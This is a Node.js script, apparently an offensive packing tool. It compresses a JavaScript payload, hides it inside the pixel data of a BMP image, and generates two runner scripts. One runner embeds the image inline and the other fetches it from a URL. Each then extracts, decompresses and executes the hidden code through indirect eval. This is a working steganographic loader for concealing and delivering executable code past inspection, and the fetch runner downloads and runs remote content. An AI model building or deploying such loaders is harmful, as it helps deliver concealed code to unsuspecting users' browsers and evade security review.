#!/usr/bin/env node
/**
 * BMP Steganography & Binary Packaging Tool
 * 
 * Usage:
 *   node pack-stego-bmp.js <input-payload.js> [output-dir] [optional-cover.bmp]
 * 
 * Generates:
 *   1. payload.bmp             - Standalone valid BMP image containing the payload bytes
 *   2. stego-runner-inline.js  - Self-contained JS runner with embedded Base64 BMP
 *   3. stego-runner-fetch.js   - Lightweight JS runner designed to fetch/load payload.bmp
 */

const fs = require('fs');
const path = require('path');
const zlib = require('zlib');

const inputFile = process.argv[2] || '/home/user/o8cmp/O8.6/final-package/O8.6-Final-final-bundle.js';
const outputDir = process.argv[3] || '/home/user/o8cmp/stego/output';
const coverBmpFile = process.argv[4] || null;

if (!fs.existsSync(inputFile)) {
  console.error(`[!] Error: Input file not found at: ${inputFile}`);
  process.exit(1);
}

fs.mkdirSync(outputDir, { recursive: true });

console.log(`[*] Reading input payload: ${inputFile}`);
let rawCode = fs.readFileSync(inputFile, 'utf8');

// Separate editable line 1 headers if present (e.g. 会員 = 2; 名 = "...";)
let headerLine = '';
let codeToCompress = rawCode;
const lines = rawCode.split('\n');
if (lines[0].includes('会員') && lines[0].includes('名')) {
  headerLine = lines[0] + '\n';
  codeToCompress = lines.slice(1).join('\n');
}

console.log(`[*] Compressing payload via Gzip...`);
const gzippedBuffer = zlib.gzipSync(Buffer.from(codeToCompress, 'utf8'), { level: 9 });
const payloadLength = gzippedBuffer.length;
console.log(`[+] Original code size: ${(rawCode.length / 1024).toFixed(2)} KB`);
console.log(`[+] Gzipped payload size: ${(payloadLength / 1024).toFixed(2)} KB`);

/**
 * Creates a valid 24-bit / 32-bit BMP file buffer with payload embedded in pixel array.
 */
function createBmpFromPayload(payloadBuf) {
  const payloadLen = payloadBuf.length;
  // We need 4 bytes for storing payload length + payloadLen bytes
  const totalDataLen = 4 + payloadLen;
  
  // Calculate image dimensions (each pixel in 24-bit is 3 bytes)
  const bytesPerPixel = 3;
  const totalPixels = Math.ceil(totalDataLen / bytesPerPixel);
  const width = Math.ceil(Math.sqrt(totalPixels));
  const height = Math.ceil(totalPixels / width);
  
  // Row size in BMP must be padded to a multiple of 4 bytes
  const rowSize = Math.floor((width * bytesPerPixel + 3) / 4) * 4;
  const pixelArraySize = rowSize * height;
  const fileSize = 54 + pixelArraySize; // 54-byte standard BMP header

  const bmpBuffer = Buffer.alloc(fileSize, 0);

  // --- BMP Header (14 bytes) ---
  bmpBuffer.write('BM', 0); // Signature
  bmpBuffer.writeUInt32LE(fileSize, 2); // File size
  bmpBuffer.writeUInt16LE(0, 6); // Reserved 1
  bmpBuffer.writeUInt16LE(0, 8); // Reserved 2
  bmpBuffer.writeUInt32LE(54, 10); // Offset to pixel array (54)

  // --- DIB Header (BITMAPINFOHEADER - 40 bytes) ---
  bmpBuffer.writeUInt32LE(40, 14); // Header size
  bmpBuffer.writeInt32LE(width, 18); // Image width
  bmpBuffer.writeInt32LE(height, 22); // Image height
  bmpBuffer.writeUInt16LE(1, 26); // Color planes (must be 1)
  bmpBuffer.writeUInt16LE(bytesPerPixel * 8, 28); // Bits per pixel (24-bit)
  bmpBuffer.writeUInt32LE(0, 30); // Compression (0 = BI_RGB uncompressed)
  bmpBuffer.writeUInt32LE(pixelArraySize, 34); // Image size
  bmpBuffer.writeInt32LE(2835, 38); // Horizontal resolution (pixels/meter)
  bmpBuffer.writeInt32LE(2835, 42); // Vertical resolution (pixels/meter)
  bmpBuffer.writeUInt32LE(0, 46); // Colors in color table
  bmpBuffer.writeUInt32LE(0, 50); // Important color count

  // --- Write Payload Length (4 bytes LE) + Gzip Data into Pixel Array ---
  const dataToEmbed = Buffer.alloc(totalDataLen);
  dataToEmbed.writeUInt32LE(payloadLen, 0);
  payloadBuf.copy(dataToEmbed, 4);

  // Copy into pixel array respecting row padding
  let srcOffset = 0;
  for (let y = 0; y < height; y++) {
    const rowOffset = 54 + y * rowSize;
    const bytesInThisRow = Math.min(width * bytesPerPixel, totalDataLen - srcOffset);
    if (bytesInThisRow > 0) {
      dataToEmbed.copy(bmpBuffer, rowOffset, srcOffset, srcOffset + bytesInThisRow);
      srcOffset += bytesInThisRow;
    }
  }

  return { bmpBuffer, width, height, fileSize };
}

/**
 * Embeds payload into an existing cover BMP file
 */
function embedInCoverBmp(coverPath, payloadBuf) {
  const coverBuf = fs.readFileSync(coverPath);
  if (coverBuf.slice(0, 2).toString('ascii') !== 'BM') {
    throw new Error('Cover file is not a valid BMP image.');
  }

  const offset = coverBuf.readUInt32LE(10);
  const totalAvailable = coverBuf.length - offset;
  const required = 4 + payloadBuf.length;

  if (totalAvailable < required) {
    throw new Error(`Cover BMP is too small. Available: ${totalAvailable} bytes, Needed: ${required} bytes`);
  }

  const outBuf = Buffer.from(coverBuf);
  // Store 4-byte length indicator at pixel offset
  outBuf.writeUInt32LE(payloadBuf.length, offset);
  payloadBuf.copy(outBuf, offset + 4);

  return outBuf;
}

let bmpResultBuffer;
if (coverBmpFile && fs.existsSync(coverBmpFile)) {
  console.log(`[*] Embedding into provided cover BMP: ${coverBmpFile}`);
  bmpResultBuffer = embedInCoverBmp(coverBmpFile, gzippedBuffer);
} else {
  console.log(`[*] Generating synthetic valid 24-bit BMP container...`);
  const res = createBmpFromPayload(gzippedBuffer);
  bmpResultBuffer = res.bmpBuffer;
  console.log(`[+] Generated BMP resolution: ${res.width}x${res.height} (${(res.fileSize / 1024).toFixed(2)} KB)`);
}

// Write standalone BMP image
const bmpOutPath = path.join(outputDir, 'payload.bmp');
fs.writeFileSync(bmpOutPath, bmpResultBuffer);
console.log(`[+] Saved standalone BMP to: ${bmpOutPath}`);

// Build Base64 encoded version for inline runner
const bmpBase64 = bmpResultBuffer.toString('base64');

// 1. Build Inline Self-Contained Stego Runner
const inlineRunnerScript = `${headerLine || 'var 会員 = 2; var 名 = "佐藤 結衣";\n'}(async()=>{
  const _b64 = "${bmpBase64}";
  const _bin = atob(_b64);
  const _buf = new Uint8Array(_bin.length);
  for (let i = 0; i < _bin.length; i++) _buf[i] = _bin.charCodeAt(i);
  
  // Read BMP pixel offset (offset 10) & payload length
  const _pixelOff = _buf[10] | (_buf[11] << 8) | (_buf[12] << 16) | (_buf[13] << 24);
  const _len = _buf[_pixelOff] | (_buf[_pixelOff + 1] << 8) | (_buf[_pixelOff + 2] << 16) | (_buf[_pixelOff + 3] << 24);
  
  // Read width & bytes per pixel for stride calculation
  const _w = _buf[18] | (_buf[19] << 8) | (_buf[20] << 16) | (_buf[21] << 24);
  const _bpp = _buf[28] | (_buf[29] << 8);
  const _bytesPerPixel = _bpp / 8;
  const _rowSize = Math.floor((_w * _bytesPerPixel + 3) / 4) * 4;
  
  // Extract contiguous payload bytes across row padding
  const _rawPayload = new Uint8Array(_len);
  let _written = 0;
  let _y = 0;
  let _dataCursor = 4; // Skip length integer
  
  while (_written < _len) {
    const _rowStart = _pixelOff + _y * _rowSize;
    const _rowAvail = (_w * _bytesPerPixel) - _dataCursor;
    const _toCopy = Math.min(_rowAvail, _len - _written);
    for (let i = 0; i < _toCopy; i++) {
      _rawPayload[_written++] = _buf[_rowStart + _dataCursor + i];
    }
    _dataCursor = 0;
    _y++;
  }

  // Decompress gzipped bytecode and evaluate
  const _ds = new DecompressionStream('gzip');
  const _writer = _ds.writable.getWriter();
  _writer.write(_rawPayload);
  _writer.close();
  const _code = await new Response(_ds.readable).text();
  (0, eval)(_code);
})();`;

const inlineOutPath = path.join(outputDir, 'stego-runner-inline.js');
fs.writeFileSync(inlineOutPath, inlineRunnerScript, 'utf8');
console.log(`[+] Saved inline self-contained stego runner to: ${inlineOutPath} (${(inlineRunnerScript.length / 1024).toFixed(2)} KB)`);

// 2. Build Remote Fetch Stego Runner (for external BMP hosting)
const fetchRunnerScript = `${headerLine || 'var 会員 = 2; var 名 = "佐藤 結衣";\n'}(async(bmpUrl = "payload.bmp")=>{
  const _resp = await fetch(bmpUrl);
  const _buf = new Uint8Array(await _resp.arrayBuffer());
  const _pixelOff = _buf[10] | (_buf[11] << 8) | (_buf[12] << 16) | (_buf[13] << 24);
  const _len = _buf[_pixelOff] | (_buf[_pixelOff + 1] << 8) | (_buf[_pixelOff + 2] << 16) | (_buf[_pixelOff + 3] << 24);
  const _w = _buf[18] | (_buf[19] << 8) | (_buf[20] << 16) | (_buf[21] << 24);
  const _bpp = _buf[28] | (_buf[29] << 8);
  const _bytesPerPixel = _bpp / 8;
  const _rowSize = Math.floor((_w * _bytesPerPixel + 3) / 4) * 4;
  
  const _rawPayload = new Uint8Array(_len);
  let _written = 0, _y = 0, _dataCursor = 4;
  while (_written < _len) {
    const _rowStart = _pixelOff + _y * _rowSize;
    const _rowAvail = (_w * _bytesPerPixel) - _dataCursor;
    const _toCopy = Math.min(_rowAvail, _len - _written);
    for (let i = 0; i < _toCopy; i++) _rawPayload[_written++] = _buf[_rowStart + _dataCursor + i];
    _dataCursor = 0;
    _y++;
  }
  const _ds = new DecompressionStream('gzip');
  const _writer = _ds.writable.getWriter();
  _writer.write(_rawPayload);
  _writer.close();
  const _code = await new Response(_ds.readable).text();
  (0, eval)(_code);
})();`;

const fetchOutPath = path.join(outputDir, 'stego-runner-fetch.js');
fs.writeFileSync(fetchOutPath, fetchRunnerScript, 'utf8');
console.log(`[+] Saved fetch stego runner to: ${fetchOutPath}`);

console.log(`\n[✓] All steganography packaging targets built successfully in: ${outputDir}`);
